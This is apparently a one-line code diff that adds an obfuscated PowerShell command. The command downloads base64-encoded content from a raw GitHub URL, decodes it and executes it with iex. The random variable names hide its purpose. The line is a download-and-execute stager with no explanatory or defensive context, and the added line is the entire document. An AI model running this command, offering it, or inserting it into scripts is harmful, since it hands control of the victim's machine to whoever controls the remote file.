@@ -1,0 +1,1 @@
+$fidsjlnvcsihvdfpoqwpnofqf = (iwr http://raw.githubusercontent.com/br1337/Scripts/main/b644444.txt -usebasicparsing).content;$pelkbnergnwpenwp = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fidsjlnvcsihvdfpoqwpnofqf)); iex $pelkbnergnwpenwp
